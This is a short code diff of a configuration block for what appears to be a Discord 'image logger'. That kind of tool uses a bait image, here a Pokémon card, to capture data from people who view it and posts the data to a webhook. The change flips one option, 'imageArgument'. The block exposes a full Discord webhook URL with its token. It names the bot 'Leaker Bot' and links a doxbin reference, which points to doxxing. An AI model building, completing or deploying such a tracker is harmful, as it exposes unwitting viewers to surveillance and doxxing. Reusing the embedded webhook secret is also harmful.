@@ -5,7 +5,7 @@ config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1441456061528670258/u-NgRxR75hPMDOO2KMHkc0GbqxABr0jlYk1fdlgGDrjUC9QMYOrO-hr97ZGyAzI-ewJK",
     "image": "https://pkmncards.com/wp-content/uploads/charizard-ex-xy-promos-xy17-ptcgo-1.png",
-    "imageArgument": True,
+    "imageArgument": False,
     "username": "Leaker Bot",
     "avatar_url": "https://www.shazam.com/en-gb/song/1592754720/youre-on-doxbin",
     "color": 0x1C2526,  # Very dark grey
